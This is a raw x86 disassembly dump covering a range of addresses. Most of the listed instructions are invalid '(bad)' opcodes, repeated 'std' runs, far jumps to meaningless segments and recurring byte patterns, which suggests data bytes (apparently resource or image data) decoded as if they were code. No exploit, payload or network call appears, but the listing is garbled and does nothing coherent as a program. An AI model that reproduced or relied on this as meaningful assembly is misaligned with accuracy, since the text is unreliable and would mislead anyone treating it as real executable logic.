11016a72:	std    
11016a73:	(bad)  
11016a74:	std    
11016a75:	std    
11016a76:	std    
11016a77:	(bad)  
11016a78:	cld    
11016a79:	jmp    0xff60:0x8ef4ffe2
11016a80:	hlt    
11016a81:	(bad)  
11016a82:	(bad)  
11016a83:	push   esp
11016a85:	nop
11016a86:	arpl   di,di
11016a88:	repz (bad) 
11016a8a:	arpl   di,di
11016a8c:	out    dx,eax
11016a8d:	mov    bl,BYTE PTR [esi-0x1]
11016a90:	in     al,dx
11016a91:	test   DWORD PTR [ecx-0x1],ebx
11016a94:	call   0xf600bf18
11016a99:	js     0x11016ae9
11016a9b:	(bad)  
11016a9c:	fbstp  TBYTE PTR [edx+0x48]
11016a9f:	(bad)  
11016aa0:	fld    TBYTE PTR [ebx+eax*2-0x1]
11016aa4:	xlat   BYTE PTR ds:[ebx]
11016aa5:	notrack call bx
11016aa9:	pusha  
11016aaa:	cmp    edi,edi
11016aac:	iret   
11016aad:	pop    ebx
11016aae:	xor    eax,0x3156cbff
11016ab3:	push   ebp
11016ab5:	loopne 0x11016a90
11016ab7:	(bad)  
11016ab8:	std    
11016ab9:	std    
11016aba:	std    
11016abb:	(bad)  
11016abc:	(bad)  
11016abd:	(bad)  
11016abe:	std    
11016abf:	inc    ecx
11016ac1:	rol    ecx,0xff
11016ac4:	or     al,0xc
11016ac6:	or     al,0xff
11016ac8:	add    BYTE PTR [eax],al
11016aca:	add    dh,ch
11016acc:	add    BYTE PTR [eax],al
11016ace:	add    BYTE PTR [eax+eax*1+0x530000],ch
11016ad5:	add    BYTE PTR [eax],al
11016ad7:	sbb    DWORD PTR [eax],eax
11016ad9:	add    BYTE PTR [eax],al
11016adb:	cmp    al,BYTE PTR [eax]
11016add:	add    BYTE PTR [eax],al
11016adf:	add    DWORD PTR [eax],0xdce0000
11016ae5:	or     eax,0xc3c3fd0d
11016aea:	ret    
11016aeb:	(bad)  
11016aec:	(bad)  
11016aed:	(bad)  
11016aee:	(bad)  
11016aef:	(bad)  
11016af0:	(bad)  
11016af1:	(bad)  
11016af2:	(bad)  
11016af3:	(bad)  
11016af4:	(bad)  
11016af5:	(bad)  
11016af6:	(bad)  
11016af7:	(bad)  
11016af8:	clc    
11016af9:	mov    esi,0x91f4ffa4
11016afe:	fs push esp
11016b01:	xchg   ebx,eax
11016b02:	push   0x6995f4ff
11016b07:	push   esp
11016b09:	xchg   ebp,eax
11016b0a:	push   0xffffffff
11016b0c:	repz xchg ebx,eax
11016b0e:	addr16 (bad) 
11016b10:	out    dx,eax
11016b11:	lea    esp,[edx-0x1]
11016b14:	in     al,dx
11016b15:	xchg   BYTE PTR [ebx-0x1],bl
11016b18:	call   0xf500c09c
11016b1d:	jns    0x11016b6d
11016b1f:	(bad)  
11016b20:	fbstp  TBYTE PTR [edx+0x48]
11016b23:	(bad)  
11016b24:	fld    TBYTE PTR [ebx+eax*2-0x1]
11016b28:	xlat   BYTE PTR ds:[ebx]
11016b29:	notrack call bx
11016b2d:	pusha  
11016b2e:	cmp    edi,edi
11016b30:	into   
11016b31:	pop    edx
11016b32:	xor    al,0xff
11016b34:	loope  0x11016ad4
11016b36:	mov    bh,bh
11016b38:	(bad)  
11016b39:	(bad)  
11016b3a:	std    
11016b3b:	(bad)  
11016b3c:	(bad)  
11016b3d:	(bad)  
11016b3e:	(bad)  
11016b3f:	(bad)  
11016b40:	(bad)  
11016b41:	(bad)  
11016b42:	(bad)  
11016b43:	inc    ecx
11016b45:	rol    ecx,0xff
11016b48:	or     al,0xc
11016b4a:	or     al,0xfe
11016b4c:	add    BYTE PTR [eax],al
11016b4e:	add    bl,bl
11016b50:	add    BYTE PTR [eax],al
11016b52:	add    BYTE PTR [ecx+0x3a000000],cl
11016b58:	add    BYTE PTR [eax],al
11016b5a:	add    BYTE PTR [eax+0x0],dl
11016b5d:	add    BYTE PTR [eax],al
11016b5f:	mov    ch,0xd
11016b61:	or     eax,0xc3c3fd0d
11016b66:	ret    
11016b67:	(bad)  
11016b68:	(bad)  
11016b69:	(bad)  
11016b6a:	(bad)  
11016b6b:	(bad)  
11016b6c:	(bad)  
11016b6d:	(bad)  
11016b6e:	(bad)  
11016b6f:	(bad)  
11016b70:	(bad)  
11016b71:	(bad)  
11016b72:	(bad)  
11016b73:	(bad)  
11016b74:	(bad)  
11016b75:	(bad)  
11016b76:	(bad)  
11016b77:	push   esi
11016b79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11016b7a:	jg     0x11016b7b
11016b7c:	hlt    
11016b7d:	xchg   esi,eax
11016b7e:	imul   edi,edi,0xfffffff5
11016b81:	call   0xff73:0x9bf5ff71
11016b88:	cmc    
11016b89:	fwait
11016b8a:	jae    0x11016b8b
11016b8c:	cmc    
11016b8d:	call   0xff6c:0x96f4ff71
11016b94:	lock (bad) 
11016b96:	gs (bad) 
11016b98:	in     al,dx
11016b99:	xchg   DWORD PTR [ebp-0x1],ebx
11016b9c:	out    0x80,eax
11016b9e:	push   ebp
11016b9f:	jmp    ebx
11016ba1:	jns    0x11016bf2
11016ba3:	(bad)  
11016ba4:	fbstp  TBYTE PTR [edx+0x48]
11016ba7:	(bad)  
11016ba8:	fld    TBYTE PTR [ebx+eax*2-0x1]
11016bac:	xlat   BYTE PTR ds:[ebx]
11016bad:	notrack call dx
11016bb1:	pop    edi
11016bb2:	cmp    bh,bh
11016bb4:	xlat   BYTE PTR ds:[ebx]
11016bb5:	ja     0x11016c0d
11016bb7:	(bad)  
11016bb8:	(bad)  
11016bb9:	(bad)  
11016bba:	std    
11016bbb:	(bad)  
11016bbc:	(bad)  
11016bbd:	(bad)  
11016bbe:	(bad)  
11016bbf:	(bad)  
11016bc0:	(bad)  
11016bc1:	(bad)  
11016bc2:	(bad)  
11016bc3:	(bad)  
11016bc4:	std    
11016bc5:	std    
11016bc6:	std    
11016bc7:	inc    ecx
11016bc9:	rol    ecx,0xff
11016bcc:	or     al,0xc
11016bce:	or     al,0xfd
11016bd0:	add    BYTE PTR [eax],al
11016bd2:	add    BYTE PTR [ecx+0x51000000],bh
11016bd8:	add    BYTE PTR [eax],al
11016bda:	add    BYTE PTR [eax+0xd],dh
11016bdd:	or     eax,0xc3c3fa0d
11016be2:	ret    
11016be3:	(bad)  
11016be4:	(bad)  
11016be5:	(bad)  
11016be6:	(bad)  
11016be7:	(bad)  
11016be8:	std    
11016be9:	std    
11016bea:	std    
11016beb:	(bad)  
11016bec:	(bad)  
11016bed:	(bad)  
11016bee:	std    
11016bef:	(bad)  
11016bf0:	(bad)  
11016bf1:	(bad)  
11016bf2:	std    
11016bf3:	(bad)  
11016bf4:	std    
11016bf5:	std    
11016bf6:	std    
11016bf7:	push   ebp
11016bf9:	call   0xff76:0x9ef5ff71
11016c00:	mul    BYTE PTR [ebx-0x5a090082]
11016c06:	cmp    edi,0xff80a5f6
11016c0c:	mul    BYTE PTR [edx-0x610a0084]
11016c12:	jbe    0x11016c13
11016c14:	hlt    
11016c15:	cwde   
11016c16:	outs   dx,DWORD PTR ds:[esi]
11016c17:	push   eax
11016c19:	nop
11016c1a:	data16 (bad) 
11016c1c:	jmp    0x11016ba5
11016c1e:	pop    ebp
11016c1f:	jmp    edi
11016c21:	jg     0x11016c78
11016c23:	jmp    ebx
11016c25:	js     0x11016c75
11016c27:	(bad)  
11016c28:	fbstp  TBYTE PTR [edx+0x48]
11016c2b:	(bad)  
11016c2c:	fld    TBYTE PTR [ebx+0x42]
11016c2f:	call   esi
11016c31:	gs cmp eax,0x4066d5ff
11016c37:	(bad)  
11016c38:	std    
11016c39:	std    
11016c3a:	std    
11016c3b:	(bad)  
11016c3c:	std    
11016c3d:	std    
11016c3e:	std    
11016c3f:	(bad)  
11016c40:	(bad)  
11016c41:	(bad)  
11016c42:	std    
11016c43:	(bad)  
11016c44:	std    
11016c45:	std    
11016c46:	std    
11016c47:	(bad)  
11016c48:	std    
11016c49:	std    
11016c4a:	std    
11016c4b:	inc    ecx
11016c4d:	rol    ecx,0xff
11016c50:	or     al,0xc
11016c52:	or     al,0xfa
11016c54:	add    BYTE PTR [eax],al
11016c56:	add    BYTE PTR [eax+0x0],dh
11016c59:	add    BYTE PTR [eax],al
11016c5b:	push   ebp
11016c5c:	or     eax,0xc3f60d0d
11016c61:	ret    
11016c62:	ret    
11016c63:	(bad)  
11016c64:	(bad)  
11016c65:	(bad)  
11016c66:	(bad)  
11016c67:	(bad)  
11016c68:	std    
11016c69:	std    
11016c6a:	std    
11016c6b:	(bad)  
11016c6c:	(bad)  
11016c6d:	(bad)  
11016c6e:	(bad)  
11016c6f:	(bad)  
11016c70:	(bad)  
11016c71:	(bad)  
11016c72:	(bad)  
11016c73:	(bad)  
11016c74:	(bad)  
11016c75:	(bad)  
11016c76:	std    
11016c77:	push   esi
11016c79:	mov    al,ds:0xa7f6ff7a
11016c7e:	cmp    edi,0xfffffff7
11016c81:	scas   eax,DWORD PTR es:[edi]
11016c82:	(bad)  
11016c83:	push   edi
11016c85:	mov    dl,0x93
11016c87:	push   edi
11016c89:	mov    dl,0x92
11016c8b:	push   edi
11016c8d:	lods   eax,DWORD PTR ds:[esi]
11016c8e:	mov    edi,?
11016c90:	mul    BYTE PTR [edi-0x5f09007d]
11016c96:	jns    0x11016c97
11016c98:	hlt    
11016c99:	cdq    
11016c9a:	outs   dx,DWORD PTR ds:[esi]
11016c9b:	push   eax
11016c9d:	(bad)  
11016c9e:	fs (bad) 
11016ca0:	jmp    0x11016c28
11016ca2:	pop    ebx
11016ca3:	(bad)  
11016ca4:	call   0xf600c127
11016ca9:	ja     0x11016cf8
11016cab:	jmp    eax
11016cad:	jno    0x11016cf6
11016caf:	(bad)  
11016cb0:	fisubr DWORD PTR [edx+0x41]
11016cb3:	(bad)  
11016cb4:	fldcw  WORD PTR [ebp+eax*2-0x1]
11016cb8:	(bad)  
11016cb9:	(bad)  
11016cba:	std    
11016cbb:	(bad)  
11016cbc:	(bad)  
11016cbd:	(bad)  
11016cbe:	std    
11016cbf:	(bad)  
11016cc0:	(bad)  
11016cc1:	(bad)  
11016cc2:	(bad)  
11016cc3:	(bad)  
11016cc4:	std    
11016cc5:	std    
11016cc6:	std    
11016cc7:	(bad)  
11016cc8:	std    
11016cc9:	std    
11016cca:	std    
11016ccb:	inc    ebx
11016ccd:	ret    
11016cce:	ret    
11016ccf:	dec    DWORD PTR ds:0xf60d0d
11016cd5:	add    BYTE PTR [eax],al
11016cd7:	push   esp
11016cd8:	add    BYTE PTR [eax],al
11016cda:	add    BYTE PTR [eax],cl
11016cdc:	add    BYTE PTR [eax],al
11016cde:	add    BYTE PTR [esi+0xd],dl
11016ce1:	or     eax,0xc3c3f60d
11016ce6:	ret    
11016ce7:	(bad)  
11016ce8:	std    
11016ce9:	std    
11016cea:	std    
11016ceb:	(bad)  
11016cec:	(bad)  
11016ced:	(bad)  
11016cee:	std    
11016cef:	(bad)  
11016cf0:	(bad)  
11016cf1:	(bad)  
11016cf2:	std    
11016cf3:	(bad)  
11016cf4:	(bad)  
11016cf5:	(bad)  
11016cf6:	std    
11016cf7:	push   edi
11016cf9:	mov    dl,0x93
11016cfb:	push   edi
11016cfd:	mov    cl,0x91
11016cff:	(bad)  
11016d00:	clc    
11016d01:	mov    ebp,0xc1f9ffa2
11016d06:	test   al,0xff
11016d08:	clc    
11016d09:	shl    BYTE PTR [edi-0x61450701],0xff
11016d10:	div    DWORD PTR [ecx-0x5809006f]
11016d16:	cmp    edi,0xfffffff5
11016d19:	sahf   
11016d1a:	jbe    0x11016d1b
11016d1c:	repz xchg esi,eax
11016d1e:	ins    BYTE PTR es:[edi],dx
11016d1f:	(bad)  
11016d20:	out    dx,eax
11016d21:	lea    esp,[ecx-0x1]
11016d24:	jmp    0x11016caa
11016d26:	pop    ecx
11016d27:	jmp    edi
11016d29:	jge    0x11016d7d
11016d2b:	jmp    ebx
11016d2d:	jbe    0x11016d7a
11016d2f:	(bad)  
11016d30:	fisubr WORD PTR [edi+0x45]
11016d33:	jmp    ecx
11016d35:	and    DWORD PTR [ecx-0x1],0xfffffffe
11016d39:	(bad)  
11016d3a:	std    
11016d3b:	(bad)  
11016d3c:	(bad)  
11016d3d:	(bad)  
11016d3e:	std    
11016d3f:	(bad)  
11016d40:	(bad)  
11016d41:	(bad)  
11016d42:	std    
11016d43:	(bad)  
11016d44:	std    
11016d45:	std    
11016d46:	std    
11016d47:	inc    edx
11016d49:	ret    0xffc2
11016d4c:	or     eax,0xf80d0d
11016d51:	add    BYTE PTR [eax],al
11016d53:	pop    edi
11016d54:	add    BYTE PTR [eax],al
11016d56:	add    BYTE PTR [ecx],cl
11016d58:	add    BYTE PTR [eax],al
11016d5a:	add    BYTE PTR [ecx],al
11016d5c:	add    BYTE PTR [eax],al
11016d5e:	add    BYTE PTR [eax],cl
11016d60:	add    BYTE PTR [eax],al
11016d62:	add    BYTE PTR [edi+0xd],dl
11016d65:	or     eax,0xc3c3f70d
11016d6a:	ret    
11016d6b:	(bad)  
11016d6c:	(bad)  
11016d6d:	(bad)  
11016d6e:	std    
11016d6f:	(bad)  
11016d70:	(bad)  
11016d71:	(bad)  
11016d72:	std    
11016d73:	(bad)  
11016d74:	(bad)  
11016d75:	(bad)  
11016d76:	std    
11016d77:	(bad)  
11016d78:	cli    
11016d79:	into   
11016d7a:	mov    edx,0x9dbaf8ff
11016d7f:	(bad)  
11016d80:	stc    
11016d81:	retf   0xffb4
11016d84:	cli    
11016d85:	sar    BYTE PTR [esi-0x44310601],1
11016d8b:	(bad)  
11016d8c:	stc    
11016d8d:	(bad)  
11016d8e:	scas   eax,DWORD PTR es:[edi]
11016d8f:	(bad)  
11016d90:	clc    
11016d91:	mov    edx,0xadf7ff9e
11016d96:	mov    edi,?
11016d98:	mul    BYTE PTR [edx-0x660a0084]
11016d9e:	jo     0x11016d9f
11016da0:	repz xchg edx,eax
11016da2:	addr16 (bad) 
11016da4:	out    dx,eax
11016da5:	mov    bl,BYTE PTR [esi-0x1]
11016da8:	jmp    0x11016d2d
11016daa:	push   esi
11016dab:	jmp    edi
11016dad:	jl     0x11016dff
11016daf:	jmp    edx
11016db1:	jne    0x11016dfc
11016db3:	(bad)  
11016db4:	in     eax,dx
11016db5:	lods   eax,DWORD PTR ds:[esi]
11016db6:	xchg   esp,eax
11016db7:	(bad)  
11016db8:	(bad)  
11016db9:	(bad)  
11016dba:	std    
11016dbb:	(bad)  
11016dbc:	(bad)  
11016dbd:	(bad)  
11016dbe:	(bad)  
11016dbf:	(bad)  
11016dc0:	(bad)  
11016dc1:	(bad)  
11016dc2:	std    
11016dc3:	inc    edx
11016dc5:	ret    0xffc2
11016dc8:	or     eax,0xfb0d0d
11016dcd:	add    BYTE PTR [eax],al
11016dcf:	test   DWORD PTR [eax],eax
11016dd1:	add    BYTE PTR [eax],al
11016dd3:	sbb    al,BYTE PTR [eax]
11016dd5:	add    BYTE PTR [eax],al
11016dd7:	add    al,BYTE PTR [eax]
11016dd9:	add    BYTE PTR [eax],al
11016ddb:	add    BYTE PTR [eax],al
11016ddd:	add    BYTE PTR [eax],al
11016ddf:	add    DWORD PTR [eax],eax
11016de1:	add    BYTE PTR [eax],al
11016de3:	or     DWORD PTR [eax],eax
11016de5:	add    BYTE PTR [eax],al
11016de7:	pusha  
11016de8:	or     eax,0xc4ff0d0d
11016ded:	(bad)  
11016df1:	(bad)  
11016df2:	std    
11016df3:	(bad)  
11016df4:	(bad)  
11016df5:	(bad)  
11016df6:	std    
11016df7:	(bad)  
11016df8:	std    
11016df9:	lock jmp 0xfaff:0xa3bdf8ff
11016e01:	sar    DWORD PTR [esi-0x33250401],1
11016e07:	(bad)  
11016e08:	sti    
11016e09:	fxch   st(2)
11016e0b:	(bad)  
11016e0c:	cli    
11016e0d:	iret   
11016e0e:	mov    ebx,0xa7c1f9ff
11016e13:	push   edi
11016e15:	mov    dl,0x92
11016e17:	push   esi
11016e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11016e1a:	cmp    bh,0xf5
11016e1d:	fwait
11016e1e:	jae    0x11016e1f
11016e20:	hlt    
11016e21:	xchg   ebp,eax
11016e22:	push   0xffffffff
11016e24:	repz (bad) 
11016e26:	arpl   di,di
11016e28:	out    dx,eax
11016e29:	mov    BYTE PTR [ebx-0x1],bl
11016e2c:	jmp    0x11016daf
11016e2e:	push   esp
11016e2f:	jmp    edi
11016e31:	jnp    0x11016e82
11016e33:	(bad)  
11016e34:	stc    
11016e35:	out    0xde,al
11016e37:	(bad)  
11016e38:	std    
11016e39:	std    
11016e3a:	std    
11016e3b:	(bad)  
11016e3c:	(bad)  
11016e3d:	(bad)  
11016e3e:	(bad)  
11016e3f:	inc    ebx
11016e41:	ret    
11016e42:	ret    0xdff
11016e45:	or     eax,0xff0d
11016e4a:	add    ah,al
11016e4c:	add    BYTE PTR [eax],al
11016e4e:	add    BYTE PTR [ebp+0x0],dl
11016e51:	add    BYTE PTR [eax],al
11016e53:	adc    eax,DWORD PTR [eax]
11016e55:	add    BYTE PTR [eax],al
11016e57:	add    DWORD PTR [eax],eax
	...
11016e61:	add    BYTE PTR [eax],al
11016e63:	add    al,BYTE PTR [eax]
11016e65:	add    BYTE PTR [eax],al
11016e67:	sbb    al,BYTE PTR [eax]
11016e69:	add    BYTE PTR [eax],al
11016e6b:	call   DWORD PTR ds:0xc4ff1011
11016e71:	(bad)  
11016e75:	(bad)  
11016e76:	(bad)  
11016e77:	(bad)  
11016e78:	(bad)  
11016e79:	(bad)  
11016e7a:	(bad)  
11016e7b:	(bad)  
11016e7c:	sti    
11016e7d:	fxch   st(1)
11016e7f:	(bad)  
11016e80:	stc    
11016e81:	int    0xb9
11016e83:	(bad)  
11016e84:	sti    
11016e85:	fcmove st,st(4)
11016e87:	(bad)  
11016e88:	sti    
11016e89:	fcmovne st,st(4)
11016e8b:	(bad)  
11016e8c:	cli    
11016e8d:	sar    BYTE PTR [esi-0x563d0601],1
11016e93:	push   edi
11016e95:	mov    bl,0x93
11016e97:	push   esi
11016e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11016e9a:	cmp    edi,0xff739bf5
11016ea0:	hlt    
11016ea1:	xchg   ebp,eax
11016ea2:	imul   edi,edi,0xff6390f4
11016ea8:	repnz mov WORD PTR [esi-0x1],ds
11016eac:	out    dx,al
11016ead:	test   DWORD PTR [edi-0x1],edx
11016eb0:	repz mov ch,0x9a
11016eb3:	(bad)  
11016eb4:	(bad)  
11016eb5:	(bad)  
11016eb6:	(bad)  
11016eb7:	(bad)  
11016eb8:	(bad)  
11016eb9:	(bad)  
11016eba:	std    
11016ebb:	inc    ebx
11016ebd:	ret    
11016ebe:	ret    
11016ebf:	call   DWORD PTR ds:0xff1011
11016ec5:	add    BYTE PTR [eax],al
11016ec7:	inc    DWORD PTR [eax]
11016ec9:	add    BYTE PTR [eax],al
11016ecb:	mov    cl,0x0
11016ecd:	add    BYTE PTR [eax],al
11016ecf:	push   ecx
11016ed0:	add    BYTE PTR [eax],al
11016ed2:	add    BYTE PTR [ebx],dl
11016ed4:	add    BYTE PTR [eax],al
11016ed6:	add    BYTE PTR [ecx],al
	...
11016ee0:	add    BYTE PTR [eax],al
11016ee2:	add    BYTE PTR [ecx],al
11016ee4:	add    BYTE PTR [eax],al
11016ee6:	add    BYTE PTR [ebx],dl
11016ee8:	add    BYTE PTR [eax],al
11016eea:	add    bh,bh
11016eec:	mov    eax,ds:0x15ff3b5a
11016ef1:	adc    DWORD PTR [eax],edx
11016ef3:	inc    esp
11016ef5:	(bad)  
11016ef9:	(bad)  
11016efa:	std    
11016efb:	(bad)  
11016efc:	(bad)  
11016efd:	cld    
11016efe:	sti    
11016eff:	(bad)  
11016f00:	cli    
11016f01:	rol    ecx,cl
11016f03:	(bad)  
11016f04:	stc    
11016f05:	int    0xb9
11016f07:	(bad)  
11016f08:	cli    
11016f09:	sar    DWORD PTR [esi-0x4b350601],1
11016f0f:	(bad)  
11016f10:	clc    
11016f11:	mov    ebp,0xaff7ffa2
11016f16:	(bad)  
11016f17:	push   esi
11016f19:	mov    ds:0x9af5ff7e,eax
11016f1e:	jno    0x11016f1f
11016f20:	hlt    
11016f21:	xchg   ebx,eax
11016f22:	push   0x618ff4ff
11016f27:	push   ebx
11016f29:	mov    WORD PTR [ebp-0x1],ds
11016f2c:	imul   BYTE PTR [ecx-0x502007a]
11016f32:	stc    
11016f33:	(bad)  
11016f34:	(bad)  
11016f35:	(bad)  
11016f36:	(bad)  
11016f37:	inc    ebx
11016f39:	ret    
11016f3a:	ret    0x15ff
11016f3d:	adc    DWORD PTR [eax],edx
11016f3f:	jmp    DWORD PTR [edx+0xff3c5b]
11016f45:	add    BYTE PTR [eax],al
11016f47:	inc    DWORD PTR [eax]
11016f49:	add    BYTE PTR [eax],al
11016f4b:	scas   eax,DWORD PTR es:[edi]
11016f4c:	add    BYTE PTR [eax],al
11016f4e:	add    BYTE PTR [eax+0x0],dl
11016f51:	add    BYTE PTR [eax],al
11016f53:	adc    eax,DWORD PTR [eax]
11016f55:	add    BYTE PTR [eax],al
11016f57:	add    DWORD PTR [eax],eax
	...
11016f61:	add    BYTE PTR [eax],al
11016f63:	add    DWORD PTR [eax],eax
11016f65:	add    BYTE PTR [eax],al
11016f67:	adc    eax,DWORD PTR [eax]
11016f69:	add    BYTE PTR [eax],al
11016f6b:	(bad)  
11016f6c:	in     al,dx
11016f6d:	test   DWORD PTR [eax-0x1],ebx
11016f70:	mov    eax,ds:0x15ff3b5b
11016f75:	adc    DWORD PTR [eax],edx
11016f77:	inc    esp
11016f79:	(bad)  
11016f7d:	(bad)  
11016f7e:	(bad)  
11016f7f:	(bad)  
11016f80:	(bad)  
11016f81:	cld    
11016f82:	sti    
11016f83:	(bad)  
11016f84:	sti    
11016f85:	fmul   st,st(1)
11016f87:	(bad)  
11016f88:	clc    
11016f89:	mov    ebp,0xb9f8ffa3
11016f8e:	popf   
11016f8f:	push   edi
11016f91:	mov    cl,0x91
11016f93:	push   esi
11016f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11016f96:	cmp    edi,0xfffffff5
11016f99:	popf   
11016f9a:	jbe    0x11016f9b
11016f9c:	hlt    
11016f9d:	xchg   esi,eax
11016f9e:	imul   edi,edi,0xfffffff4
11016fa1:	nop
11016fa2:	fs push esp
11016fa5:	mov    fs,WORD PTR [eax-0x1]
11016fa8:	clc    
11016fa9:	mov    esp,0xfafdffa0
11016fae:	stc    
11016faf:	(bad)  
11016fb0:	(bad)  
11016fb1:	(bad)  
11016fb2:	(bad)  
11016fb3:	inc    ebx
11016fb5:	ret    
11016fb6:	ret    
11016fb7:	call   DWORD PTR ds:0xa2ff1011
11016fbd:	pop    ebx
11016fbe:	cmp    al,0xff
11016fc0:	in     al,dx
11016fc1:	test   DWORD PTR [eax-0x1],ebx
11016fc4:	add    BYTE PTR [eax],al
11016fc6:	add    bh,bh
11016fc8:	add    BYTE PTR [eax],al
11016fca:	add    BYTE PTR [edi+0x50000000],ch
11016fd0:	add    BYTE PTR [eax],al
11016fd2:	add    BYTE PTR [ebx],dl
11016fd4:	add    BYTE PTR [eax],al
11016fd6:	add    BYTE PTR [ecx],al
	...
11016fe0:	add    BYTE PTR [eax],al
11016fe2:	add    BYTE PTR [ecx],al
11016fe4:	add    BYTE PTR [eax],al
11016fe6:	add    BYTE PTR [ebx],dl
11016fe8:	add    BYTE PTR [eax],al
11016fea:	add    bh,bh
11016fec:	xrelease mov DWORD PTR [edx-0x1],ebx
11016ff0:	in     al,dx
11016ff1:	test   DWORD PTR [eax-0x1],ebx
11016ff4:	mov    eax,ds:0x15ff3b5a
11016ff9:	adc    dl,BYTE PTR [eax]
11016ffb:	inc    esp
11016ffd:	(bad)  
11017001:	(bad)  
11017002:	std    
11017003:	(bad)  
11017004:	(bad)  
11017005:	(bad)  
11017006:	(bad)  
11017007:	(bad)  
11017008:	std    
11017009:	lock jmp 0xf7ff:0xbacefaff
11017011:	mov    bl,0x93
11017013:	push   esi
11017015:	mov    al,ds:0x9bf5ff7a
1101701a:	jb     0x1101701b
1101701c:	mul    BYTE PTR [edi+edi*2-0x5c410601]
11017023:	(bad)  
11017024:	cld    
11017025:	jmp    0xfffd:0xfefeffe2
1101702c:	(bad)  
1101702d:	(bad)  
1101702e:	std    
1101702f:	inc    ebx
11017031:	ret    
11017032:	ret    
11017033:	call   DWORD PTR ds:0xa2ff1011
11017039:	pop    ebx
1101703a:	cmp    al,0xff
1101703c:	in     al,dx
1101703d:	test   DWORD PTR [eax-0x1],ebx
11017040:	xrelease mov DWORD PTR [edx-0x1],ebx
11017044:	add    BYTE PTR [eax],al
11017046:	add    bh,bh
11017048:	add    BYTE PTR [eax],al
1101704a:	add    BYTE PTR [edi+0x50000000],ch
11017050:	add    BYTE PTR [eax],al
11017052:	add    BYTE PTR [ebx],dl
11017054:	add    BYTE PTR [eax],al
11017056:	add    BYTE PTR [ecx],al
	...
11017060:	add    BYTE PTR [eax],al
11017062:	add    BYTE PTR [ecx],al
11017064:	add    BYTE PTR [eax],al
11017066:	add    BYTE PTR [ebx],dl
11017068:	add    BYTE PTR [eax],al
1101706a:	add    bh,bh
1101706c:	hlt    
1101706d:	mov    bl,BYTE PTR [ebx-0x1]
11017070:	xrelease mov DWORD PTR [edx-0x1],ebx
11017074:	in     al,dx
11017075:	test   DWORD PTR [eax-0x1],ebx
11017078:	mov    eax,ds:0x15ff3b5b
1101707d:	adc    DWORD PTR [eax],edx
1101707f:	inc    esp
11017081:	(bad)  
11017085:	(bad)  
11017086:	(bad)  
11017087:	(bad)  
11017088:	(bad)  
11017089:	(bad)  
1101708a:	std    
1101708b:	(bad)  
1101708c:	(bad)  
1101708d:	(bad)  
1101708e:	std    
1101708f:	(bad)  
11017090:	(bad)  
11017091:	(bad)  
11017092:	std    
11017093:	(bad)  
11017094:	(bad)  
11017095:	(bad)  
11017096:	std    
11017097:	(bad)  
11017098:	std    
11017099:	std    
1101709a:	std    
1101709b:	(bad)  
1101709c:	(bad)  
1101709d:	(bad)  
1101709e:	(bad)  
1101709f:	(bad)  
110170a0:	(bad)  
110170a1:	(bad)  
110170a2:	(bad)  
110170a3:	(bad)  
110170a4:	std    
110170a5:	std    
110170a6:	std    
110170a7:	(bad)  
110170a8:	(bad)  
110170a9:	(bad)  
110170aa:	(bad)  
110170ab:	inc    ebx
110170ad:	ret    
110170ae:	ret    0x15ff
110170b1:	adc    DWORD PTR [eax],edx
110170b3:	jmp    DWORD PTR [edx-0x1300c3a5]
110170b9:	test   DWORD PTR [eax-0x1],ebx
110170bc:	xrelease mov DWORD PTR [edx-0x1],ebx
110170c0:	hlt    
110170c1:	mov    bl,BYTE PTR [ebx-0x1]
110170c4:	add    BYTE PTR [eax],al
110170c6:	add    bh,bh
110170c8:	add    BYTE PTR [eax],al
110170ca:	add    BYTE PTR [esi+0x50000000],ch
110170d0:	add    BYTE PTR [eax],al
110170d2:	add    BYTE PTR [ebx],dl
110170d4:	add    BYTE PTR [eax],al
110170d6:	add    BYTE PTR [ecx],al
	...
110170e0:	add    BYTE PTR [eax],al
110170e2:	add    BYTE PTR [ecx],al
110170e4:	add    BYTE PTR [eax],al
110170e6:	add    BYTE PTR [ecx],dl
110170e8:	add    BYTE PTR [eax],al
110170ea:	add    bh,bh
110170ec:	hlt    
110170ed:	mov    bl,BYTE PTR [ebx-0x1]
110170f0:	hlt    
110170f1:	mov    bl,BYTE PTR [ebx-0x1]
110170f4:	xrelease mov DWORD PTR [edx-0x1],ebx
110170f8:	in     al,dx
110170f9:	test   DWORD PTR [eax-0x1],ebx
110170fc:	mov    eax,ds:0x15ff3b5b
11017101:	adc    DWORD PTR [eax],edx
11017103:	inc    esp
11017105:	(bad)  
11017109:	(bad)  
1101710a:	std    
1101710b:	(bad)  
1101710c:	(bad)  
1101710d:	(bad)  
1101710e:	std    
1101710f:	(bad)  
11017110:	(bad)  
11017111:	(bad)  
11017112:	std    
11017113:	(bad)  
11017114:	(bad)  
11017115:	(bad)  
11017116:	(bad)  
11017117:	(bad)  
11017118:	(bad)  
11017119:	(bad)  
1101711a:	std    
1101711b:	(bad)  
1101711c:	(bad)  
1101711d:	(bad)  
1101711e:	(bad)  
1101711f:	(bad)  
11017120:	(bad)  
11017121:	(bad)  
11017122:	(bad)  
11017123:	(bad)  
11017124:	std    
11017125:	std    
11017126:	std    
11017127:	inc    ebx
11017129:	ret    
1101712a:	ret    
1101712b:	call   DWORD PTR ds:0xa2ff1011
11017131:	pop    ebx
11017132:	cmp    al,0xff
11017134:	in     al,dx
11017135:	test   DWORD PTR [eax-0x1],ebx
11017138:	xrelease mov DWORD PTR [edx-0x1],ebx
1101713c:	hlt    
1101713d:	mov    bl,BYTE PTR [ebx-0x1]
11017140:	hlt    
11017141:	mov    bl,BYTE PTR [ebx-0x1]
11017144:	add    BYTE PTR [eax],al
11017146:	add    bh,bh
11017148:	add    BYTE PTR [eax],al
1101714a:	add    BYTE PTR [edx+0x4a000000],ah
11017150:	add    BYTE PTR [eax],al
11017152:	add    BYTE PTR [ecx],dl
11017154:	add    BYTE PTR [eax],al
11017156:	add    BYTE PTR [ecx],al
	...
11017160:	add    BYTE PTR [eax],al
11017162:	add    BYTE PTR [ecx],al
11017164:	add    BYTE PTR [eax],al
11017166:	add    BYTE PTR ds:0xff000000,cl
1101716c:	hlt    
1101716d:	mov    bl,BYTE PTR [ebx-0x1]
11017170:	hlt    
11017171:	mov    bl,BYTE PTR [ebx-0x1]
11017174:	hlt    
11017175:	mov    bl,BYTE PTR [ebx-0x1]
11017178:	xrelease mov DWORD PTR [edx-0x1],ebx
1101717c:	in     al,dx
1101717d:	test   DWORD PTR [eax-0x1],ebx
